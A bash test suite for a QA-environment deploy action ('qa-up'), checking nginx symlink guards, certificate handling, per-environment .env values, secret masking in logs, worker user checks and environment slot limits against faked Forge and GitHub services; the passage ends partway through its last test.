#!/usr/bin/env bash
# shellcheck disable=SC2317,SC2016  # t_* run through test_case; a $ in single quotes is nginx's or the script's own
# Tests for bringing a QA environment up (actions/qa-up/up.sh): isolated sites whose nginx refuses links to other
# owners' files before any code goes in, at the top of Forge's site.conf fragment, once Forge applied it, and proved
# on each site by a link to a root-owned file whose content must not come back; certificates that fail deleted, waited
# for and asked for again once, and one not enabled enabled; daemons and scheduled jobs of another user gone before
# the code; the code and the frontend as data through the gate; the environment's own services, kept secrets and
# .env, the template read entry by entry; a Reverb app of its own, whose public settings are the ones qa-plan built
# the frontend with and whose secret stays the same from deploy to deploy; a deploy script and a worker that refuse
# any user but the site user; /up asked again after a 502, and the commit said to be deployed only after it; slots,
# two first deploys at once included; and secrets never in the log. Offline: Forge, GitHub and the gate are fakes
# that answer as the real ones do.
set -euo pipefail
SUITE=qa-up
# shellcheck source=tests/lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
# shellcheck source=tests/qa-world.sh
source "$(dirname "${BASH_SOURCE[0]}")/qa-world.sh"
skip_unless has_box_tools "this host lacks bash 5, flock or GNU date, which the QA actions need"
skip_unless has_tomllib "python3 has no tomllib (needs 3.11+)"

UP="$ROOT/actions/qa-up/up.sh"
SHA=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
APP_KEY="base64:$(printf 'app-key-of-environment-%09d' 7 | base64 -w0)"
SECRETS=(db-pw-7 redis-pw-7 mail-pw-7 bucket-pw-files bucket-pw-media reverb-pw-7-1 "$APP_KEY")
WORKER="bash -c 'test \"\$(id -un)\" = shop_qa_7 || exit 78; exec php8.4 artisan queue:work --queue=default,mail --tries=3 --max-time=3600'"
TWO='[app]
name = "shop"
backend_dir = "api"
frontend_dir = "web"
php = "8.4"

[app.build]
frontend = "npm run build"
after_deploy = ["config:cache", "route:cache"]
queues = ["default", "mail"]

[qa]
zone = "qa.example.dev"
max_envs = 3
disks = { files = "AWS_", media = "MEDIA_" }
public_disks = ["media"]'

# app <toml> [<path=content>...]: the app's mroom.toml, GitHub's tarball of $SHA with those files, a frontend
# build in $T/dist, the shared .env template and /up answering 200.
app() {
  qa_world
  printf '%s\n' "$1" >"$MROOM_CONFIG"
  shift
  local top="$T/src/example-shop-${SHA:0:7}" file
  mkdir -p "$top" "$T/dist/assets"
  for file in "$@"; do mkdir -p "$(dirname "$top/${file%%=*}")"; printf '%s\n' "${file#*=}" >"$top/${file%%=*}"; done
  tar -czf "$GH_FAKE/tarball.tgz" -C "$T/src" "example-shop-${SHA:0:7}"
  echo '<html>app</html>' >"$T/dist/index.html"
  echo 'console.log(1)' >"$T/dist/assets/app.js"
  export MROOM_QA_DIST="$T/dist" FORGE_UP="$T/up-codes" LABEL=qa
  # A runner sets GITHUB_ACTIONS, with which up.sh masks its secrets; the test that wants that sets it itself.
  unset GITHUB_ACTIONS
  # Its Reverb lines as Reverb's installer writes them, the Vite ones reading the others.
  export MROOM_QA_ENV_TEMPLATE=$'APP_NAME=Shop\nAPP_KEY=base64:from-the-template\nDB_PASSWORD=from-the-template\nMAPS_KEY=test-maps-key\nMAIL_ENCRYPTION=tls\nAPP_ENV=production\nBROADCAST_CONNECTION=pusher\nREVERB_APP_SECRET=template-reverb-secret\nREVERB_HOST="localhost"\nVITE_REVERB_HOST="${REVERB_HOST}"'
  echo 200 >"$FORGE_UP"
}
up() { run "$UP" 7 "$SHA"; }
state() { jq -r "$1" "$FORGE_STATE"; }
env_sent() { cat "$GATE/env-put.in"; }
has_line() { grep -qxF -- "$2" <<<"$1"; }
has_text() { case "$1" in *"$2"*) return 0 ;; esac; return 1; }
# gets_cookie <host> <cookie domain>: whether a cookie set for that domain goes to the host: the domain itself, or a
# host whose name ends in . and the domain (RFC 6265; a leading dot of the domain is ignored).
gets_cookie() { local d="${2#.}"; [ "$1" = "$d" ] || [[ "$1" == *".$d" ]]; }
members() { tar -tzf "$1" | sort; }
API="$(api_host 7)" WEB="$(web_host 7)"

t_a_new_environment_comes_up() {
  app "$TWO" api/artisan=php api/public/index.php=php
  up
  expect_rc 0; expect_out_has "environment 7: up at https://$WEB"
  expect_out_has "$WEB: a link to a root-owned file is not served (it answered 200 with another body)"
  # Both sites isolated in the user's own home; Forge gives the web root as an absolute path.
  run state '[.sites[] | "\(.name) \(.type) \(.user) \(.isolated) \(.web_directory) \(.php_version)"] | join("\n")'
  expect_out "$API php shop_qa_7 true /home/shop_qa_7/$API/api/public PHP 8.4"$'\n'"$WEB static-html shop_qa_7 true /home/shop_qa_7/$WEB null"
  # The guard sits at the top of each site's fragment, outside any block, which each domain includes in its server.
  run state '.sites[0].nginx'
  expect_out_has $'\ndisable_symlinks if_not_owner;\n\nssl_protocols TLSv1.2 TLSv1.3;'
  run state '.sites[1].nginx'
  expect_out_has $'\ndisable_symlinks if_not_owner;\n\nssl_protocols'
  expect_out_has 'try_files $uri $uri/ /index.html;'
  run order
  expect_out $'forge POST /sites\nforge POST /sites/101/domains/1010/certificates\nforge PUT /sites/101/nginx
forge POST /sites\nforge POST /sites/103/domains/1030/certificates\nforge PUT /sites/103/nginx
gate probe-link 7 api\ngate probe-link 7 web
gate code-put 7 '"$SHA"$'\ngate dist-put 7\ngate db-create 7\ngate redis-user-add 7\ngate mail-user-add 7
gate bucket-create 7 files\ngate bucket-create 7 media public\ngate reverb-app-add 7\ngate app-key 7\ngate env-put 7
forge PUT /sites/101/deployments/script\nforge POST /sites/101/deployments\nforge POST /background-processes'
  # The code is GitHub's tarball, as it came; the frontend, the build's files.
  expect_true "the code put is not GitHub's tarball" cmp -s "$GATE/code-put.in" "$GH_FAKE/tarball.tgz"
  run members "$GATE/dist-put.in"; expect_out $'./\n./assets/\n./assets/app.js\n./index.html'
  # The commit is said to be deployed only now, at the end.
  run cat "$GITHUB_OUTPUT"; expect_out "sha=$SHA"$'\n'"app_url=https://$WEB"$'\n'"api_url=https://$API"
  run cat "$FORGE_UP.log"; expect_out 200
  # The link to the box's site-op, put before any code: not served. The api site's app answers 404, and the
  # frontend's site's single-page fallback 200 with its index.html: neither is the linked file.
  run cat "$FORGE_UP.probe"; expect_out $'404\n200'
}

t_nginx_is_guarded_once_forge_applied_it() {
  app "$TWO" api/artisan=php
  # Forge applies a config later: here after three reads of it.
  forge_set '.nginx_reads = 3'
  up
  expect_rc 0
  # A config Forge accepts but never applies keeps the code out.
  app "$TWO" api/artisan=php
  forge_set '.nginx_put_ignored = true'
  export MROOM_QA_NGINX_WAIT=20
  up
  expect_rc 1; expect_err_has "site 101's nginx config still lacked the guard 20s after it was sent, so no code goes in"
  run gate_log; expect_out ""
  run gh_log; expect_out_has 'mroom-qa: failed'
}

# fragment <config>: the existing api site's nginx config, as Forge would give it.
fragment() { jq --arg c "$1" '.sites[-1].nginx = $c' "$FORGE_STATE" >"$FORGE_STATE.new" && mv "$FORGE_STATE.new" "$FORGE_STATE"; }

t_a_guard_in_a_comment_or_a_block_does_not_count() {
  app "$TWO" api/artisan=php
  made_site 50 7 api /api/public 8.4
  # Only in a comment and inside a location: neither is the server's own, and the one inside the block would
  # stay, so the deploy stops and a person fixes it.
  fragment $'# disable_symlinks if_not_owner;\nlocation /x {\n    disable_symlinks if_not_owner;\n}\nlocation / {\n    try_files $uri $uri/ /index.php?$query_string;\n}\n'
  up
  expect_rc 1; expect_err_has "site 50's nginx config cannot be guarded as it is (no disable_symlinks if_not_owner at the top of the site's config, alone), so no code goes in"
  run gate_log; expect_out "env-sha 7"
  # In a comment alone: the guard goes on top.
  fragment $'# disable_symlinks if_not_owner;\nlocation / {\n    try_files $uri $uri/ /index.php?$query_string;\n}\n'
  rm -f "$FORGE_LOG"
  up
  expect_rc 0
  run grep -c '^PUT /sites/50/nginx' "$FORGE_LOG"; expect_out 1
  run state '.sites[] | select(.id == 50) | .nginx'; expect_out_has $'disable_symlinks if_not_owner;\n\n# disable_symlinks if_not_owner;'
}

t_a_server_block_that_overrides_the_fragment_keeps_the_code_out() {
  app "$TWO" api/artisan=php
  # The domain's server block sets its own disable_symlinks, which would clash with the fragment's, or win.
  forge_set '.server_extra = "    disable_symlinks off;"'
  up
  expect_rc 1; expect_err_has "site 101's nginx server block does not take its site config as it is, so no code goes in"
  run gate_log; expect_out ""
  # One Forge cannot give stops it too.
  app "$TWO" api/artisan=php
  made_site 50 7 api /api/public 8.4
  forge_set '.fail["GET /sites/50/domains/500/nginx"] = 500'
  up
  expect_rc 1; expect_err_has "site 50's nginx server block does not take its site config as it is"
  run gate_log; expect_out "env-sha 7"
}

t_a_link_nginx_still_serves_stops_the_deploy() {
  app "$TWO" api/artisan=php
  # Forge's config is guarded, but nginx serves the link to the box's site-op anyway, as when a config of the box's
  # own overrides the site's: the run stops before any code goes in.
  forge_set '.probe_follows = true'
  up
  expect_rc 1
  expect_err_has "https://$API served a link to a root-owned file, so nginx follows links it must not (D17), and no code goes in"
  run gate_log; expect_out "probe-link 7 api"
  run gh_log; expect_out_has "mroom-qa: failed"
  # The frontend's site is proved too.
  app "$TWO" api/artisan=php
  forge_set ".probe_follows = \"$WEB\""
  up
  expect_rc 1; expect_err_has "https://$WEB served a link to a root-owned file"
  run gate_log; expect_out $'probe-link 7 api\nprobe-link 7 web'
  # Served only until nginx has reloaded the config Forge just wrote: asked again, it is refused, and the run goes on.
  app "$TWO" api/artisan=php
  forge_set '.probe_follows_for = 1'
  up
  expect_rc 0; expect_out_has "$API: a link to a root-owned file is not served (it answered 404 with another body)"
  run cat "$FORGE_UP.probe"; expect_out $'200\n404\n200'
  # With the guard, the request goes on to the app, which here answers 200 to any path: that is not the linked file.
  app "$TWO" api/artisan=php
  forge_set '.catch_all = true'
  up
  expect_rc 0
  run cat "$FORGE_UP.probe"; expect_out $'200\n200'
  # No answer, a gate that cannot put the link, or one that names no SHA-256: nothing can be told, and no code goes in.
  app "$TWO" api/artisan=php
  forge_set '.probe_code = "000"'
  up
  expect_rc 1; expect_err_has "https://$API/mroom-symlink-probe did not answer, so whether nginx follows links cannot be told"
  app "$TWO" api/artisan=php
  echo 1 >"$GATE/probe-link.rc"
  up
  expect_rc 1; expect_err_has "the gate could not put the link that proves nginx's guard in $API"
  run gate_log; expect_out "probe-link 7 api"
  app "$TWO" api/artisan=php
  printf 'target=/usr/local/libexec/mroom/site-op\n' >"$GATE/probe-link.out"
  up
  expect_rc 1; expect_err_has "the gate named no SHA-256 of the file it linked in $API, so the proof cannot be judged"
  run gate_log; expect_out "probe-link 7 api"
}

t_the_env_holds_the_environments_own_values() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0
  local sent line
  sent="$(env_sent)"
  for line in APP_NAME=Shop MAPS_KEY=test-maps-key DB_CONNECTION=pgsql DB_HOST=127.0.0.1 DB_DATABASE=shop_qa_7 \
    DB_USERNAME=shop_qa_7 DB_PASSWORD=db-pw-7 REDIS_USERNAME=shop_qa_7 REDIS_PASSWORD=redis-pw-7 \
    REDIS_PREFIX=shop:qa7: HORIZON_PREFIX=shop:qa7:horizon: REDIS_HOST=127.0.0.1 REDIS_PORT=6379 MAIL_MAILER=smtp \
    MAIL_HOST=127.0.0.1 MAIL_PORT=1025 MAIL_USERNAME=shop_qa_7 MAIL_PASSWORD=mail-pw-7 MAIL_SCHEME=smtp \
    MAIL_ENCRYPTION=null AWS_BUCKET=shop-qa-7-files AWS_ACCESS_KEY_ID=GKfiles \
    AWS_SECRET_ACCESS_KEY=bucket-pw-files AWS_DEFAULT_REGION=garage AWS_ENDPOINT=https://s3.qa.example.dev \
    AWS_USE_PATH_STYLE_ENDPOINT=true MEDIA_BUCKET=shop-qa-7-media MEDIA_URL=https://files.qa.example.dev/shop-qa-7-media \
    BROADCAST_CONNECTION=reverb BROADCAST_DRIVER=reverb "REVERB_APP_ID=$(reverb_app 7)" "REVERB_APP_KEY=$(reverb_app 7)" \
    REVERB_APP_SECRET=reverb-pw-7-1 REVERB_HOST=ws.qa.example.dev REVERB_PORT=443 REVERB_SCHEME=https \
    "VITE_REVERB_APP_KEY=$(reverb_app 7)" VITE_REVERB_HOST=ws.qa.example.dev VITE_REVERB_PORT=443 VITE_REVERB_SCHEME=https \
    APP_ENV=qa APP_DEBUG=false SESSION_SECURE_COOKIE=true "APP_KEY=$APP_KEY" \
    "APP_URL=https://$API" "CLIENT_URL=https://$WEB" "SESSION_DOMAIN=.$WEB" SESSION_COOKIE=shop_qa_7_sid \
    XSRF_COOKIE_NAME=shop_qa_7_csrf "CORS_ALLOWED_ORIGINS=https://$WEB" "SANCTUM_STATEFUL_DOMAINS=$WEB,$API" \
    CACHE_PREFIX=shop_qa_7_cache_; do
    expect_true ".env lacks $line" has_line "$sent" "$line"
  done
  # The session and XSRF cookies are for .7.qa.example.dev, the environment's two hosts: not for the zone, whose other
  # environments' hosts and shared Garage and Reverb hosts would get them. Their names are not those of before mroom
  # 0.5.0, whose cookies a browser may still hold for the whole zone.
  local host domain
  domain="$(sed -n 's/^SESSION_DOMAIN=//p' <<<"$sent")"
  for host in "$(web_host 17)" "$(api_host 17)" "$(web_host 70)" "$(api_host 1)" s3.qa.example.dev files.qa.example.dev \
    ws.qa.example.dev qa.example.dev; do
    expect_true "the cookies of environment 7 reach $host" eval '! gets_cookie "$host" "$domain"'
  done
  expect_true "the cookies of environment 7 miss its own hosts" gets_cookie "$API" "$domain"
  expect_true "the cookies of environment 7 miss its own hosts" gets_cookie "$WEB" "$domain"
  expect_true "the cookies have the names of before 0.5.0" lacks "$sent" "_session"
  expect_true "the cookies have the names of before 0.5.0" lacks "$sent" "_xsrf"
  # The template's own key, password, TLS and environment are replaced, never kept beside mroom's; a private disk
  # has no URL.
  run grep -c -e '^APP_KEY=' -e '^DB_PASSWORD=' -e '^MAIL_ENCRYPTION=' -e '^APP_ENV=' <<<"$sent"; expect_out 4
  expect_true "the template's app key was kept" lacks "$sent" "from-the-template"
  expect_true "a private disk got a URL" lacks "$sent" "AWS_URL="
  # So are its Reverb lines, the Vite one that reads another too.
  run grep -c -e '^BROADCAST_CONNECTION=' -e '^REVERB_APP_SECRET=' -e '^REVERB_HOST=' -e '^VITE_REVERB_HOST=' <<<"$sent"
  expect_out 4
  expect_true "the template's Reverb secret was kept" lacks "$sent" "template-reverb-secret"
  expect_true "a Vite value of the template's that reads another was kept" lacks "$sent" '${REVERB_HOST}'
  # No key comes twice, whoever wrote it. This template's values are one line each.
  local twice
  twice="$(cut -d= -f1 <<<"$sent" | sort | uniq -d | paste -sd' ' -)"
  expect_true "the .env has these keys more than once: $twice" [ -z "$twice" ]
  # The app key is the gate's, the same each deploy, so the environment's users stay signed in.
  up
  run grep -c "^APP_KEY=$APP_KEY\$" "$GATE/env-put.in"; expect_out 1
}

t_the_template_is_read_entry_by_entry() {
  app "$TWO" api/artisan=php
  export MROOM_QA_ENV_TEMPLATE=$'APP_NAME=Shop\nPRIVATE_KEY="-----BEGIN KEY-----\nAPP_KEY=part-of-the-key\n-----END KEY-----"\n# a comment\nexport APP_KEY=base64:from-the-template\nNOTE=\'one\nDB_PASSWORD=inside\ntwo\'\nDB_PASSWORD=from-the-template'
  up
  expect_rc 0
  local sent block note
  sent="$(env_sent)"
  block=$'PRIVATE_KEY="-----BEGIN KEY-----\nAPP_KEY=part-of-the-key\n-----END KEY-----"'
  note=$'NOTE=\'one\nDB_PASSWORD=inside\ntwo\''
  # A quoted value of several lines stays whole, a line in it that looks like a key mroom sets too.
  expect_true "a value of several lines lost a line" has_text "$sent" "$block"
  expect_true "a single-quoted value lost a line" has_text "$sent" "$note"
  expect_true "a comment went" has_line "$sent" "# a comment"
  # The template's own entries of keys mroom sets go, one with export too, and mroom's own come once.
  expect_true "the template's app key or password was kept" lacks "$sent" "from-the-template"
  run grep -c -x -F "APP_KEY=$APP_KEY" <<<"$sent"; expect_out 1
  run grep -c -x -F "DB_PASSWORD=db-pw-7" <<<"$sent"; expect_out 1
}

t_secrets_never_reach_the_log() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0
  local secret
  for secret in "${SECRETS[@]}" not-a-real-key fake-forge-token; do
    expect_true "the log shows $secret" lacks "$out$err" "$secret"
  done
  # On a runner, each is masked first, which is the one line that may name it.
  export GITHUB_ACTIONS=true
  rm -f "$GATE/gate.log"
  up
  expect_rc 0
  for secret in "${SECRETS[@]}"; do
    expect_true "$secret is not masked" has_line "$out" "::add-mask::$secret"
    expect_true "$secret shows outside its mask" [ "$(grep -c -- "$secret" <<<"$out")" = 1 ]
  done
  expect_true "the key folder or the .env was left in TMPDIR" tmp_empty
}

t_a_gate_line_that_could_hold_a_value_is_never_shown() {
  app "$TWO" api/artisan=php
  printf 'database shop_qa_7: created\nDB_DATABASE=shop_qa_7\nDB_USERNAME=shop_qa_7\nDB_PASSWORD=db-pw-7\nDB_PASSWORD=pw with a space\n::set-output name=x::y\nnotice: a value=1\n' \
    >"$GATE/db-create.out"
  up
  expect_rc 0
  expect_out_has "    database shop_qa_7: created"
  expect_out_has "(3 line(s) of the gate's answer not shown, since they may hold a value)"
  expect_true "a line with a space in its value was shown" lacks "$out" "pw with a space"
  expect_true "a workflow command was shown" lacks "$out" "::set-output"
}

t_scratch_files_go_under_the_runners_temp() {
  app "$TWO" api/artisan=php
  mkdir -p "$T/runner"
  export RUNNER_TEMP="$T/runner"
  up
  expect_rc 0
  expect_true "a scratch folder was left in RUNNER_TEMP" eval '[ -z "$(find "$T/runner" -mindepth 1 -print -quit)" ]'
  expect_true "a scratch folder went to TMPDIR, not RUNNER_TEMP" tmp_empty
  expect_true "the key was not kept under RUNNER_TEMP" grep -q -x "$T/runner/mroom-qa\.[A-Za-z0-9]*/key" "$GATE/ssh.argv"
}

t_the_deploy_script_and_the_worker_refuse_any_other_user() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0
  run state '.sites[0].script'
  expect_out_has $'set -eo pipefail\ntest "$(id -un)" = shop_qa_7 || exit 78\n'
  expect_out_has $'cd /home/shop_qa_7/'"$API"$'/api\nif [ -x /home/shop_qa_7/'"$API"$'/.mroom/hooks/qa-deploy ]; then'
  expect_true "the deploy script links a probe of its own" lacks "$out" "mroom-symlink-probe"
  expect_out_has $'if [ -x /home/shop_qa_7/'"$API"$'/.mroom/hooks/qa-deploy ]; then\n  /home/shop_qa_7/'"$API"$'/.mroom/hooks/qa-deploy\nelse'
  expect_out_has $'  "$php" artisan migrate --force\n  "$php" artisan config:cache\n  "$php" artisan route:cache\nfi'
  expect_out_has '"$php" artisan mroom:qa-fixtures'
  expect_out_has '"$php" artisan queue:restart'
  expect_out_has 'php="${FORGE_PHP:-php8.4}"'
  expect_true "the deploy script pulls" lacks "$out" "git "
  expect_true "the deploy script builds a frontend" lacks "$out" "npm"
  run state '[.processes[] | "\(.user)|\(.directory)|\(.command)|\(.processes)"] | join("\n")'
  expect_out "shop_qa_7|/home/shop_qa_7/$API/api|$WORKER|1"
  # The worker's command runs: as the site user it runs on, as anyone else it exits 78 before any code.
  local script
  script="$(state '.processes[0].command' | sed -n "s/^bash -c '\(.*\)'\$/\1/p")"
  run bash -c "${script/exec php8.4/echo would run php8.4}"
  expect_rc 78
}

t_a_single_app_gets_its_build_in_the_code() {
  app $'[app]\nname = "shop"\n\n[app.build]\nfrontend = "npm run build"\n\n[qa]\nzone = "qa.example.dev"\n\n[qa.parity]\nbroadcast = "log"\nmail = "log"\nfiles = "local"' \
    artisan=php public/index.php=php public/build/old.js=old
  # GitHub's tarball starts with a global header that names the commit.
  python3 -I - "$T/src" "$GH_FAKE/tarball.tgz" "$SHA" <<'PY'
import os, sys, tarfile
src, dst, sha = sys.argv[1:]
with tarfile.open(dst, "w:gz", format=tarfile.PAX_FORMAT, pax_headers={"comment": sha}) as tf:
    tf.add(os.path.join(src, f"example-shop-{sha[:7]}"), arcname=f"example-shop-{sha[:7]}")
PY
  up
  expect_rc 0; expect_out_has "with the frontend build in public/build"
  run python3 -I -c 'import sys, tarfile; print(tarfile.open(sys.argv[1]).pax_headers.get("comment"))' "$GATE/code-put.in"
  expect_out "$SHA"
  run state '[.sites[] | "\(.name) \(.web_directory)"] | join("\n")'; expect_out "$API /home/shop_qa_7/$API/public"
  run members "$GATE/code-put.in"
  expect_out "example-shop-aaaaaaa/
example-shop-aaaaaaa/artisan
example-shop-aaaaaaa/public/
example-shop-aaaaaaa/public/build/
example-shop-aaaaaaa/public/build/assets/
example-shop-aaaaaaa/public/build/assets/app.js
example-shop-aaaaaaa/public/build/index.html
example-shop-aaaaaaa/public/index.php"
  expect_no_file "$GATE/dist-put.in"
  run gate_log; expect_out $'probe-link 7 api\ncode-put 7 '"$SHA"$'\ndb-create 7\nredis-user-add 7\napp-key 7\nenv-put 7'
  local sent
  sent="$(env_sent)"
  expect_true ".env lacks MAIL_MAILER=log" has_line "$sent" MAIL_MAILER=log
  expect_true ".env lacks FILESYSTEM_DISK=local" has_line "$sent" FILESYSTEM_DISK=local
  expect_true ".env lacks CLIENT_URL" has_line "$sent" "CLIENT_URL=https://$API"
  expect_true ".env lacks SESSION_DOMAIN=null" has_line "$sent" SESSION_DOMAIN=null
  run cat "$GITHUB_OUTPUT"; expect_out "sha=$SHA"$'\n'"app_url=https://$API"$'\n'"api_url=https://$API"
}

t_an_existing_environment_is_refreshed() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0
  : >"$ORDER_LOG"
  up
  expect_rc 0
  # No second site, certificate, nginx edit or worker: the gate's word that its code went in, then only the proof, the
  # code, the services, the .env and a deploy.
  run order
  expect_out $'gate env-sha 7\ngate probe-link 7 api\ngate probe-link 7 web\ngate code-put 7 '"$SHA"$'\ngate dist-put 7\ngate db-create 7\ngate redis-user-add 7\ngate mail-user-add 7
gate bucket-create 7 files\ngate bucket-create 7 media public\ngate reverb-app-add 7\ngate app-key 7\ngate env-put 7
forge PUT /sites/101/deployments/script\nforge POST /sites/101/deployments'
  run state '.sites | length'; expect_out 2
  run state '.processes | length'; expect_out 1
  run gh_log
  expect_out_has $'### QA environment\\n<!-- mroom-qa: ready -->\\n\\n| | |\\n|---|---|\\n| App | https://'"$WEB"$' |\\n| API | https://'"$API"$' |\\n\\nUpdated for `'"$SHA"'`.'
  run grep -c '^POST 7 ' "$GH_FAKE/gh.log"; expect_out 1
  run grep -c '^PATCH ' "$GH_FAKE/gh.log"; expect_out 1
}

t_a_worker_whose_command_changed_is_made_again() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0
  # Other queues now: the old worker goes, and one with the new command comes.
  printf '%s\n' "${TWO/queues = \[\"default\", \"mail\"\]/queues = [\"default\"]}" >"$MROOM_CONFIG"
  up
  expect_rc 0; expect_out_has "deleted worker 106, whose command is not the one wanted now"
  run state '[.processes[].command] | join("\n")'
  expect_out "${WORKER/--queue=default,mail/--queue=default}"
}

t_a_site_made_with_another_php_is_refused() {
  app "$TWO" api/artisan=php
  made_site 50 7 api /api/public 8.3
  up
  expect_rc 1
  expect_err_has "$API runs PHP 8.3, and app.php is 8.4. A site's PHP version is set when it is made: tear the environment down (gh workflow run qa-down.yml -f pr_number=7)"
  run gate_log; expect_out "env-sha 7"
  # Only a teardown fixes it, so the comment does not say that the next push tries again.
  run gh_log; expect_out_has "mroom-qa: failed"; expect_out_has "runs PHP 8.3"
  expect_true "the comment says the next push tries again" lacks "$out" "The next push tries again"
}

t_a_site_whose_web_root_is_elsewhere_is_refused() {
  app "$TWO" api/artisan=php
  made_site 50 7 api /public 8.4
  up
  expect_rc 1; expect_err_has "$API's web root is /home/shop_qa_7/$API/public, not /home/shop_qa_7/$API/api/public"
  run gate_log; expect_out "env-sha 7"
}

t_a_new_environment_waits_for_a_slot() {
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  site 3 "$(web_host 3)" installed
  site 4 "$(api_host 4)" removing
  up
  expect_rc 0; expect_out_has "::warning::All 3 QA environments are in use, so this pull request waits for a slot."
  run forge_writes; expect_out ""
  run gate_log; expect_out ""
  run sed -n 's/^refused=//p' "$GITHUB_OUTPUT"; expect_out_has "All 3 QA environments are in use"
  run gh_log; expect_out_has 'POST 7 ### QA environment\n<!-- mroom-qa: waiting since=2026-10-27T12:00:00Z -->'
  # An environment whose code went in is refreshed, however many there are.
  made_site 5 7 api /api/public 8.4
  code_went_in 7
  up
  expect_rc 0
  run gate_log; expect_out_has $'env-sha 7\nprobe-link 7 api\nprobe-link 7 web\ncode-put 7 '"$SHA"
  # One whose code never went in, such as the site a first deploy that stopped left, is new still: past qa.max_envs,
  # it gives way, its site deleted and waited for until Forge has it gone.
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  site 3 "$(web_host 3)" installed
  made_site 5 7 api /api/public 8.4
  up
  expect_rc 0; expect_out_has "site 5 gave way, past qa.max_envs"
  expect_out_has "::warning::All 3 QA environments are in use, so this pull request waits for a slot."
  run gate_log; expect_out "env-sha 7"
  run forge_writes; expect_out "DELETE /sites/5"
  run state '[.sites[].id] | map(tostring) | join(",")'; expect_out "1,2,3"
  # A new one that has a site already counts only the others, and comes up beside two.
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  made_site 5 7 api /api/public 8.4
  up
  expect_rc 0; expect_out_has "environment 7: up at https://$WEB"
}

t_a_site_forge_is_still_making_is_new() {
  app "$TWO" api/artisan=php
  made_site 5 7 api /api/public 8.4
  # Installing for the run's first reads of Forge, up to its look at whether the environment is new.
  forge_set '.sites[-1] += {status: "installing", install_reads: 8}'
  up
  expect_rc 0; expect_out_has "environment 7: up at https://$WEB"
  # Nothing is asked of the gate about it: before Forge has made a site, the gate may know no site user.
  run gate_log; expect_true "env-sha ran for a site Forge was still making" lacks "$out" "env-sha"
}

# other_site <N>: a site of environment N, as another run's first deploy asks Forge for it (sites_made_first/after).
other_site() {
  jq -nc --arg name "$(api_host "$1")" --arg user "$(site_user "$1")" \
    '{name: $name, type: "php", is_isolated: true, isolated_user: $user, web_directory: "/api/public", php_version: "php84"}'
}

t_a_site_that_could_not_give_way_gives_way_on_the_next_run() {
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  # Environment 8 made its first site just before this one's, and Forge refuses this one's delete.
  forge_set ".sites_made_first = [$(other_site 8)] | .fail[\"DELETE /sites/102\"] = 500"
  up
  expect_rc 1
  expect_err_has "Forge did not remove site 102, made past qa.max_envs, though its delete went twice; the next run gives way again"
  run grep -c '^DELETE /sites/102$' "$FORGE_LOG"; expect_out 2
  run gate_log; expect_out ""
  # The next run finds site 102, but its code never went in, so it is new still, and gives way again: it never comes
  # up beside three others.
  up
  expect_rc 1; expect_err_has "Forge did not remove site 102"
  expect_true "a fourth environment came up past qa.max_envs" lacks "$out" "environment 7: up"
  run gate_log; expect_out "env-sha 7"
  # Once Forge takes the delete, the run waits for a slot, and three environments are left.
  forge_set 'del(.fail)'
  up
  expect_rc 0; expect_out_has "site 102 gave way, past qa.max_envs"
  expect_out_has "::warning::All 3 QA environments are in use, so this pull request waits for a slot."
  run state '[.sites[] | select(.status != "removing") | .name] | length'; expect_out 3
  run state '[.sites[].id] | map(tostring) | join(",")'; expect_out "1,2,101"
}

t_giving_way_outlasts_a_delete_forge_drops() {
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  # Forge accepts the first delete and never runs it: the delete goes again, and the site goes.
  forge_set ".sites_made_first = [$(other_site 8)] | .site_deletes_dropped = 1"
  export MROOM_QA_GIVE_WAY_WAIT=10
  up
  expect_rc 0
  expect_out_has "site 102 is still there; its delete goes again"
  expect_out_has "site 102 gave way, past qa.max_envs"
  run grep -c '^DELETE /sites/102$' "$FORGE_LOG"; expect_out 2
  run state '[.sites[].id] | map(tostring) | join(",")'; expect_out "1,2,101"
  # A delete sent while Forge is still making the site may never run, so it is sent once Forge has made it.
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  forge_set ".sites_made_first = [$(other_site 8)] | .installing_delete_dropped = true | .install_reads = 3"
  up
  expect_rc 0; expect_out_has "site 102 gave way, past qa.max_envs"
  run grep -c '^DELETE /sites/102$' "$FORGE_LOG"; expect_out 1
  # A site that never goes fails the run.
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  forge_set ".sites_made_first = [$(other_site 8)] | .site_deletes_dropped = 2"
  up
  expect_rc 1; expect_err_has "Forge did not remove site 102, made past qa.max_envs, though its delete went twice"
  run gate_log; expect_out ""
}

t_an_environment_of_the_old_names_is_torn_down_not_refreshed() {
  # Brought up before mroom 0.5.0, as api-7: no site goes up beside it under the new names, and its teardown says how.
  app "$TWO" api/artisan=php
  made_site 50 7 api /api/public 8.4
  forge_set ".sites[-1].name = \"$(old_api_host 7)\""
  up
  expect_rc 1
  expect_err_has "environment 7 was brought up as $(old_api_host 7), a name mroom gave QA sites before 0.5.0. Tear it down (gh workflow run qa-down.yml -f pr_number=7), and the next deploy brings it up as $WEB and $API"
  run forge_writes; expect_out ""
  run gate_log; expect_out ""
  # The comment says why and how, and not that the next push tries again: it would be refused as well.
  run gh_log; expect_out_has "mroom-qa: failed"; expect_out_has "was brought up as $(old_api_host 7)"
  expect_true "the comment says the next push tries again" lacks "$out" "The next push tries again"
  # Its frontend's site alone is enough.
  app "$TWO" api/artisan=php
  site 51 "$(old_web_host 7)" installed
  up
  expect_rc 1; expect_err_has "environment 7 was brought up as $(old_web_host 7)"
  # It is refused first, before a site of the new names that Forge is removing is waited for or deleted again.
  app "$TWO" api/artisan=php
  site 54 "$API" removing "$(ago 86400)" "$(ago 7200)"
  site 55 "$(old_web_host 7)" installed
